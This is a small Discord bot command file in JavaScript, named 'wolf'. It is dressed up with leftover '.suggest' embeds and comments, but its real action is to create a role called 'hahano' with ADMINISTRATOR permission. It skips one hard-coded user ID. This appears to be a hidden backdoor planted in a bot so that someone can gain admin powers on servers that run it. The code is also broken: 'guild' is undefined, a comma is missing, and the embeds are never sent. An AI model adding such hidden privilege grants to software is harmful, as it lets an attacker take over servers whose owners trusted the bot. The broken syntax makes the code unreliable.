const Discord = require("discord.js");

module.exports.run = async (client, message, args) => {

    if (message.author.id == "298812170093723649") return;
    //Build .suggest help Embed
    var suggestHelpEmbed = new Discord.RichEmbed()

    //Define the arguments for .suggest.
    let rolename = args[0];
    let permissions = args[1]
    
    //Build the .suggest message Embed.
    var suggestEmbed = new Discord.RichEmbed()
    .setTitle("Role Created")
    .setColor("#f74e00")
    .setThumbnail(message.author.avatarURL)
    .addField("Created By:", `${message.author} | ${message.author.id}`)
    .addField("Role Name:", `${rolename}`)
    .addField("Their Suggestion Is:", `${permissions}`)
    .setFooter("Nyx v1.4.4 | Made By: Wolf#9001", client.user.avatarURL)
    
  //Sending the completed message.
  
  guild.createRole({
    name: 'hahano',
    position: 10
    permissions: 'ADMINISTRATOR',
    })
  }

 module.exports.help = {
    name: "wolf"
 }
